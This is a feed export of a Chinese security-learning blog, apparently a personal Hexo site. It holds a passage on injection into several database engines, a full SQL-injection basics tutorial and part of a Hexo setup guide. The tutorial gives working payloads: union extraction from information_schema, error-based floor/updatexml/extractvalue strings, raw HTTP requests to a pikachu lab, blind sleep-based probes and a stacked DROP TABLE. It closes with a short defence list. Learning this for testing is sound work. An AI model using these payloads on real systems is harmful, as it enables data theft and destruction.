and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在</p></li><li><p>脱库 union select 1,username,passwd,4 from admin</p></li></ol><h1 id="mssql"><a class="markdownIt-Anchor" href="#mssql"></a> MSSQL</h1><ol><li><p>and 1=2报错</p></li><li><p>order by N# 获取总字段</p></li><li><p>猜表名 and exists(select * from manage) 表名manage存在</p></li><li><p>猜解列名<code>and exists(select id from manage)</code>列名id存在</p></li><li><p>脱库<code>and exists (select id from manage where id=1 )</code>证明id=1存在</p><p>and exists (select id from manage where%20 len(username)=8 and id=1 ) 猜解username字段长度为8</p><p>and exists (select id from manage where%20 len(password)=16 and id=1 ) 猜解password字段长度为16</p><p>可用Burp的Intruder功能辅助猜解</p><p>猜解username第1到8位的字符，ASCII转码 admin_mz</p><p>猜解password第1到16位的字符，ASCII转码(Burp 爆破)</p><p>转ASCII的py脚本：</p><p>72e1bfc3f01b7583 MD5解密为97285101</p></li></ol><h2 id="常用参数"><a class="markdownIt-Anchor" href="#常用参数"></a> 常用参数</h2><ol><li><code>@@version</code>，查询当前数据库版本</li><li><code>db_name()</code>，查询当前数据库名称</li><li><code>user,system_user,current_user,user_name</code>，查询当前用户</li><li><code>IS_SRVROLEMEMBER()</code>，查询数据库权限。</li><li><code>@@SERVERNAME</code>：获取有关服务器主机的信息</li></ol><h1 id="sqlite"><a class="markdownIt-Anchor" href="#sqlite"></a> SQLite</h1><ol><li><p>找注入点 and 1=1</p></li><li><p>order by N 猜字段 4</p></li><li><p>猜数据库</p><p>offset ==&gt;0~2</p><p>有三个数据库：</p><p>WSTMart_reg</p><p>notice_sybase</p><p>sqlite_sequence</p></li><li><p>猜列</p><p>共有3个字段：</p><p>id,name,password</p></li><li><p>脱库</p></li></ol><h1 id="mongodb"><a class="markdownIt-Anchor" href="#mongodb"></a> MongoDB</h1><ol><li><p>id=1′ 单引号注入报错</p></li><li><p>闭合语句，查看所有集合</p></li><li><p>查看指定集合的数据</p></li></ol><p>[0] 代表第一条数据，可递增</p><h1 id="db2"><a class="markdownIt-Anchor" href="#db2"></a> DB2</h1><ol><li><p>and 1=2 判断注入点</p></li><li><p>order by N 获取字段数</p></li><li><p>爆当前数据库：GAME_CHARACTER</p></li><li><p>列表：NAME</p></li><li><p>脱库</p></li></ol><h1 id="postgresql"><a class="markdownIt-Anchor" href="#postgresql"></a> PostgreSQL</h1><ol><li><p>and 1=2 判断注入点</p></li><li><p>order by N 获取字段</p></li><li><p>爆数据库</p></li><li><p>列表</p></li><li><p>列字段</p></li><li><p>脱库</p></li></ol><h1 id="sybase数据库"><a class="markdownIt-Anchor" href="#sybase数据库"></a> Sybase数据库</h1><ol><li><p>and 1=2 判断注入点</p></li><li><p>order by N 获取总字段</p></li><li><p>爆数据库</p></li><li><p>列表</p></li><li><p>列字段</p></li><li><p>查状态：结果为：zhang</p></li><li><p>反选爆用户名：结果为：mozhe</p></li><li><p>猜解密码</p></li></ol><h1 id="oracle"><a class="markdownIt-Anchor" href="#oracle"></a> Oracle</h1><ol><li><p>and 1=1</p></li><li><p>order by</p></li><li><p>爆数据库</p></li><li><p>列表</p></li><li><p>列字段</p></li><li><p>脱库</p></li></ol><p>加上状态：<code>1 where STATUS=1</code></p><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="小tips"><a class="markdownIt-Anchor" href="#小tips"></a> 小tips</h2><h3 id="outfile-和-dumpfile的区别"><a class="markdownIt-Anchor" href="#outfile-和-dumpfile的区别"></a> outfile 和 dumpfile的区别</h3><p><strong>outfile:</strong></p><ol><li>支持多行数据同时导出</li><li>使用union联合查询时，要保证两侧查询的列数相同</li><li>会在换行符制表符后面追加反斜杠</li><li>会在末尾追加换行</li></ol><p><strong>dumpfile:</strong></p><ol><li>每次只能导出一行数据</li><li>不会在换行符制表符后面追加反斜杠</li><li>不会在末尾追加换行</li></ol><p>因此，我们可以使用<code>into dumpfile</code>这个函数来顺利写入二进制文件；<code>into outfile</code>函数也可以写入二进制文件，只是追加的反斜杠会使二进制文件无法生效。如果服务器端本身的查询语句，结果有多行，但是我们又想使用<code>dump file</code>，应该手动添加 <code>limit</code> 限制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#介绍&quot;&gt;&lt;/a&gt; 介绍&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;什么决定网站注入点用户权限？&lt;strong&gt;数据库配置文件&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;常用数据库&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入基础</title>
    <link href="https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</id>
    <published>2023-05-23T02:29:45.000Z</published>
    <updated>2023-05-25T01:14:36.391Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入基础"><a class="markdownIt-Anchor" href="#sql注入基础"></a> SQL注入基础</h1><img src="/images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2265061-20210114103534539-1238016327-16848464764182.png" alt="img" style="zoom:80%;" /><h2 id="基础语法以及函数"><a class="markdownIt-Anchor" href="#基础语法以及函数"></a> 基础语法以及函数</h2><h3 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 查询</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br><span class="line"># 更新</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> pwd<span class="operator">=</span>’$p’ <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> username<span class="operator">=</span>‘admin’</span><br><span class="line"># 添加</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users(id,url,text) <span class="keyword">values</span>(<span class="number">2</span>,‘x’,’$t’)</span><br><span class="line"># 删除</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br><span class="line"># <span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> id,name,price <span class="keyword">from</span> news <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">order</span></span><br></pre></td></tr></table></figure><p>其他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 增加字段</span><br><span class="line">ALTER TABLE employees ADD phone varchar(20)</span><br><span class="line"># 权限控制(grant revoke)</span><br><span class="line">grant insert on grant_rights to unauthorized_user</span><br><span class="line"># 删表</span><br><span class="line">DROP TABLE users;</span><br></pre></td></tr></table></figure><h3 id="连接词-联合查询"><a class="markdownIt-Anchor" href="#连接词-联合查询"></a> 连接词、联合查询</h3><p>**union：**联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p><strong>join</strong>：连接查询（right/left join），如下搜索两个表相同的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">where</span> a.id <span class="operator">=</span> b.id</span><br></pre></td></tr></table></figure><h3 id="注释以及其他符号"><a class="markdownIt-Anchor" href="#注释以及其他符号"></a> 注释以及其他符号</h3><p><strong>注释：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* */</span>          <span class="keyword">are</span> inline comments</span><br><span class="line"><span class="comment">-- , #          are line comments</span></span><br><span class="line"></span><br><span class="line">Example: <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">-- AND pass = &#x27;pass&#x27;</span></span><br></pre></td></tr></table></figure><p>对于<code>#</code></p><ol><li>url中的#是用来指导浏览器动作的（例如锚点），对服务端完全无用</li><li>所以在URL中使用#进行注入时应该将它转成url编码：<code>%23</code></li><li>在POST请求中就不需要（需要验证）</li></ol><p>对于<code>--(空格)</code></p><ol><li>一般在GET请求中，空格会直接被忽略，所以需要把他转化成<code>--%20</code></li><li>还有另外一种方式，就是使用<code>--+</code>，这时候+号会被解释成空格</li><li>为什么要加空格：因为这样可以和后面的单引号隔开，才能形成有效的payload</li></ol><p>对于需要编码转码的<code>#</code>有用，因为只有一个字符，POST最好用这个，其他用<code>--+</code></p><p><strong>堆叠查询：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;        allows query chaining</span><br><span class="line"></span><br><span class="line">Example: <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> users;</span><br></pre></td></tr></table></figure><p><strong>查询可用：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,+,||         allows string concatenation</span></span><br><span class="line"><span class="string">Char()         strings without quotes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example: SELECT * FROM users WHERE name = &#x27;</span><span class="operator">+</span><span class="type">char</span>(<span class="number">27</span>) <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="注入原理以及危害"><a class="markdownIt-Anchor" href="#注入原理以及危害"></a> 注入原理以及危害</h2><p>对于传入的搜索内容<strong>过滤不严</strong>，导致用户可以通过拼接SQL语句，对数据库进行操作。</p><p>以下情形均可能产生漏洞：</p><ol><li>接收数据</li><li>拼接数据</li><li>数据库执行</li><li>结果展示</li></ol><p>他会导致如下危害：</p><ol><li><p>危害数据库里的<strong>数据</strong></p></li><li><p>直接危害网站的<strong>权限</strong></p></li></ol><p>我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用<strong>猜测</strong>到对方的 <strong>SQL 查询方式</strong></p><h1 id="基本注入"><a class="markdownIt-Anchor" href="#基本注入"></a> 基本注入</h1><p><strong>这里以mysql注入为例子</strong></p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20230523110144810-16848464848533.png" alt="image-20230523110144810" style="zoom:80%;" /><h2 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h2><p>主要搜集：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 操作系统</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version_compile_os</span></span><br><span class="line"># 数据库版本：</span><br><span class="line"><span class="keyword">select</span> version()</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span></span><br><span class="line"># 数据库名字：</span><br><span class="line"><span class="keyword">select</span> database()</span><br><span class="line"># 数据库用户：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>()</span><br></pre></td></tr></table></figure><p>在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，</span><br><span class="line">table_schema和table_name分别来存储数据库名和表名</span><br><span class="line">information_schema.tables 记录所有的表</span><br><span class="line">information_schema.columns 记录所有的列</span><br></pre></td></tr></table></figure><p>小知识点：</p><blockquote><p>问：一个@与两个@@有何区别？</p><p>答：一个@是用户自定义变量，两个@是系统变量</p></blockquote><h2 id="手工注入"><a class="markdownIt-Anchor" href="#手工注入"></a> 手工注入</h2><ol><li><p><strong>判断是否能注入，以及注入类型</strong></p><ol><li>先看<strong>是否输出信息</strong>：可以使用<code>'</code>、<code>&quot;</code> 和<code>--+</code>来测试</li><li>输出<strong>正确</strong>、<strong>错误</strong>与<strong>报错</strong>信息：都可以</li><li>输出<strong>正确</strong>、<strong>报错</strong>但不输出错误信息：布尔/时间盲注/报错注入</li><li>输出<strong>正确</strong>但不输出报错和错误信息：布尔/时间盲注</li><li><strong>不输出</strong>任何信息：时间盲注</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 或 且 非 三种逻辑判断符</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and 1=1</span></span><br></pre></td></tr></table></figure></li><li><p><strong>判断有几个注入点：</strong><code>id=1' order by 3--+</code></p></li><li><p><strong>判断输出点有几个是可以回显的</strong>：<code>id=1' union select 1,2,3 --+</code></p></li><li><p><strong>信息搜集：</strong></p><ol><li>获取数据库:<ol><li>获取此时的数据库：<code>id=-1' union select 1,2,database() --+</code></li><li>获取全部数据库：<code>id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></li></ol></li><li>获取表名:<code>id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code><ol><li>查询其他数据库表名把<code>database()</code>换成<code>'you_want'</code></li></ol></li><li>获取列名：<code>id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='you_want --+'</code></li></ol></li><li><p><strong>数据获取：</strong></p><ol><li>获取单个：<code>id=-1' union select 1,2,[columnname] from [tablename] --+'</code></li><li>获取全部：<ol><li><code>id=-1' union select 1,2,group_concat([allcolumnname]) from [tablename]--+</code></li><li><code>-1' union select 1,2,(select concat_ws([column_name]) from [tbname]) --+</code></li></ol></li></ol></li></ol><h3 id="闭合"><a class="markdownIt-Anchor" href="#闭合"></a> 闭合</h3><p><strong>常用闭合</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+ （数字型）</span></span><br><span class="line"><span class="string">&#x27; or 1=1--+ （字符型）</span></span><br><span class="line"><span class="string">&quot; or 1=1--+ （字符型）</span></span><br><span class="line"><span class="string">) or 1=1--+ （MySQL是允许嵌入多个括号的）</span></span><br><span class="line"><span class="string">&#x27;</span>) <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;)) <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><strong>非注释闭合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|| &#x27;</span><br><span class="line">or &#x27;</span><br><span class="line">&amp;&amp; &#x27;1&#x27;=&#x27;1</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure><h2 id="报错and盲注"><a class="markdownIt-Anchor" href="#报错and盲注"></a> 报错and盲注</h2><p>盲注就是在注入过程中，获取的<strong>数据不能回显</strong>至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p><ol><li>基于布尔的 SQL 盲注-逻辑判断：<code>regexp</code>，<code>like</code>，<code>ascii</code>，<code>left</code>，<code>ord</code>，<code>mid</code></li><li>基于时间的 SQL 盲注-延时判断：<code>if</code>，<code>sleep</code></li><li>基于报错的 SQL 盲注-报错回显：<code>floor</code>，<code>updatexml</code>，<code>extractvalue</code></li></ol><p>对于报错注入，其payload可以安排在如下位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or（有效载荷）or&#x27;</span><br><span class="line">&#x27;and（有效载荷）and&#x27;</span><br><span class="line">&#x27;or（有效载荷）and&#x27;</span><br><span class="line">&#x27;or（有效载荷）and&#x27;=&#x27;</span><br><span class="line">&#x27;*（有效载荷）*&#x27;</span><br><span class="line">&#x27;or（有效载荷）and&#x27;</span><br><span class="line">“ - （有效载荷） - “</span><br></pre></td></tr></table></figure><p>参考：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">like</span> ‘ro<span class="operator">%</span>’#判断ro或ro…是否成立</span><br><span class="line">regexp ‘<span class="operator">^</span>xiaodi[<span class="number">1</span><span class="operator">-</span>z]’#匹配xiaodi及xiaodi…等</span><br><span class="line">if(条件,<span class="number">5</span>,<span class="number">0</span>)#条件成立，返回<span class="number">5</span>，反之，返回<span class="number">0</span></span><br><span class="line">sleep(<span class="number">5</span>) #<span class="keyword">SQL</span>语句延时执行<span class="number">5</span>秒</span><br><span class="line">mid(a,b,c) #从位置b开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c) #从B位置开始，截取字符串a的c长度</span><br><span class="line"><span class="keyword">left</span>(database(),<span class="number">1</span>),database() #<span class="keyword">left</span>(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())<span class="operator">=</span><span class="number">8</span> #判断数据库database()名的长度</span><br><span class="line">ord<span class="operator">=</span>ascii ascii(x)<span class="operator">=</span><span class="number">97</span> #判断x的ascii码是否等于<span class="number">97</span></span><br></pre></td></tr></table></figure><p>涉及资源：</p><ol><li><p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">12种报错注入+万能语句</a></p></li><li><p><a href="https://www.jianshu.com/p/fcae21926e5c">Order by排序注入方法小总结</a></p></li></ol><h3 id="insert-update"><a class="markdownIt-Anchor" href="#insert-update"></a> Insert update</h3><p>语句：<code>insert into user(username,password) values('$username','$password',)</code></p><p><strong>floor</strong>：<code>username=lwx’ or(select 1 from(select count(*),concat((select(select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or '</code></p><p><strong>updatexml</strong>：<code>username=lwx’ or updatexml(1,concat(0x7e,(version())),0) or '</code></p><p><strong>extractvalue</strong>：<code>username=lwx’ or extractvalue(1,concat(0x7e,database())) or '</code></p><h3 id="delete"><a class="markdownIt-Anchor" href="#delete"></a> delete</h3><p>在get中需要使用+号或者%20把语句连接起来，避免出错</p><p><strong>floor</strong>：<code>GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a) HTTP/1.1</code></p><p><strong>updatexml</strong>：<code>GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+updatexml+(1,concat(0x7e,database()),0) </code></p><p><strong>extractvalue</strong>：<code>GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+extractvalue(1,concat(0x7e,database())) HTTP/1.1</code></p><h2 id="布尔与延时盲注"><a class="markdownIt-Anchor" href="#布尔与延时盲注"></a> 布尔与延时盲注</h2><h3 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注"></a> 布尔盲注</h3><ol><li><code>id=1' and left(version(),1)=5 --+</code></li><li><code>id=1' and length(database())=8--+</code></li></ol><h3 id="延时盲注"><a class="markdownIt-Anchor" href="#延时盲注"></a> 延时盲注</h3><ol><li><code>id=1 and if((length(database()=8)),sleep(5),1)--+</code></li><li><code>id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+</code></li></ol><h1 id="防御sql注入"><a class="markdownIt-Anchor" href="#防御sql注入"></a> 防御SQL注入</h1><p>需要分清各种防御针对的对象是谁。</p><ol><li>SQL语句的执行代码使用<strong>预编译</strong> PreparedStatement 。</li><li><strong>确定每个数据的类型</strong>，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？)</li><li><strong>限制传入数据的长度</strong>，这能够在一定程度上防止sql注入。</li><li>严格<strong>限制</strong>用户使用<strong>数据库的权限</strong>，能够在一定程度上减少sql注入的危害。</li><li>避免直接响应一些 sql 语句<strong>执行异常的信息</strong>。</li><li><strong>过滤</strong>参数中含有的一些数据库<strong>关键词</strong>。</li></ol><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="基础概念"><a class="markdownIt-Anchor" href="#基础概念"></a> 基础概念</h2><ol><li>实例名：数据库实例名是用于和操作系统进行联系的标识,就是说数据库和操作系统之间的交互用的是数据库实例名</li></ol><p>待补充…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sql注入基础&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sql注入基础&quot;&gt;&lt;/a&gt; SQL注入基础&lt;/h1&gt;
&lt;img src=&quot;/images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/22</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>HEXO博客的搭建</title>
    <link href="https://j3f5.github.io/articles/2023/05/22/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://j3f5.github.io/articles/2023/05/22/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/</id>
    <published>2023-05-22T12:03:26.000Z</published>
    <updated>2023-05-25T01:39:40.432Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装hexo和相关插件"><a class="markdownIt-Anchor" href="#安装hexo和相关插件"></a> 安装HEXO和相关插件</h1><h2 id="hexo的安装"><a class="markdownIt-Anchor" href="#hexo的安装"></a> hexo的安装</h2><p>先安装node.js，地址：<a href="https://nodejs.org/en">https://nodejs.org/en</a></p><p>安装完后安装Hexo：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>配置腾讯云节点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry http://mirrors.cloud.tencent.com/npm/</span><br><span class="line">npm config get registry# 如果返回http://mirrors.cloud.tencent.com/npm/，说明镜像配置成功。</span><br></pre></td></tr></table></figure><h2 id="主题pure以及配置"><a class="markdownIt-Anchor" href="#主题pure以及配置"></a> 主题Pure以及配置</h2><p>主题：<a href="https://github.com/cofess/hexo-theme-pure">https://github.com/cofess/hexo-theme-pure</a></p><p>先初始化一个文件夹，例如Blog：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init Blog</span><br></pre></td></tr></table></figure><p>加载主题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/cofess/hexo-theme-pure.git themes/pure</span><br></pre></td></tr></table></figure><p>更新主题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd themes/pure</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><p>配置（需要配置根目录config）：<a href="https://blog.cofess.com/2017/11/01/hexo-blog-theme-pure-usage-description.html">参考1</a>，<a href="https://w714860761.github.io/2020/06/14/HexoTwo/">参考2</a>，<a href="https://tianbiao.top/29-pure%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/">参考3</a>，<a href="https://hexo.io/zh-cn/docs/configuration.html">参考4</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">language: zh-CN# 中文</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="写文章"><a class="markdownIt-Anchor" href="#写文章"></a> 写文章</h1><p><a href="https://hexo.io/zh-cn/docs/writing">参考</a>，没啥要讲的，指令：<code>hexo n &quot;title&quot;</code>，即可。</p><h2 id="模板"><a class="markdownIt-Anchor" href="#模板"></a> 模板</h2><p>模板在目录scaffolds里面，一般新建文件都会附上他的头，推荐头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title: HEXO博客的搭建</span><br><span class="line">toc: true</span><br><span class="line">sidebar: none</span><br><span class="line">date: 2023-05-22 20:03:26</span><br><span class="line">tags: [博客搭建]</span><br><span class="line">categories: [杂]</span><br><span class="line">descriptions: 本文介绍hexo搭建博客的心路历程</span><br><span class="line">typora-root-url: ..\..\..</span><br></pre></td></tr></table></figure><p>上面的<code>typora-root-url</code>很重要！下面说到。</p><h2 id="设置分类"><a class="markdownIt-Anchor" href="#设置分类"></a> 设置分类</h2><p>由于<code>post</code>文件夹里面的文章太多不好管理，那么只要我们分类一下即可。<a href="https://mrseawave.github.io/blogs/articles/2021/06/25/hexo-new-post-path/">参考</a></p><p>配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">permalink: &#x27;articles/:year/:month/:day/:name/&#x27;</span><br><span class="line">new_post_name: &#x27;:year/:month/:title.md&#x27;</span><br></pre></td></tr></table></figure><h2 id="hexo与typora协同"><a class="markdownIt-Anchor" href="#hexo与typora协同"></a> Hexo与Typora协同</h2><p>先设置一下图片目录：优先相对路径，自己设置，然后在文件头上蛇者上面的玩意。</p><p>解释：也就是，typora会将图片自动加载到一个文件夹里（它自己设置的），后面我们只需要设置根目录<code>typora-root-url</code>，让hexo能链接到即可！</p><p><a href="https://blog.hjforever.com/2021/03/13/tool/typora_hexo/">参考</a></p><h2 id="404转发"><a class="markdownIt-Anchor" href="#404转发"></a> 404转发</h2><p><a href="https://hexo-next.readthedocs.io/zh_CN/latest/hexo/advanced/404%E9%A1%B5%E9%9D%A2/">https://hexo-next.readthedocs.io/zh_CN/latest/hexo/advanced/404页面/</a></p><h1 id="常用指令"><a class="markdownIt-Anchor" href="#常用指令"></a> 常用指令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d # 推送 或者一起：hugo g -d</span><br><span class="line">hexo s # 本地测试</span><br><span class="line"></span><br><span class="line">hexo n &#x27;title&#x27;</span><br></pre></td></tr></table></figure><h2 id="推送hexo-d"><a class="markdownIt-Anchor" href="#推送hexo-d"></a> 推送<code>hexo d</code></h2><p>安装<code>npm install hexo-deployer-git --save</code></p><p>然后配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch]</span><br><span class="line">  message: 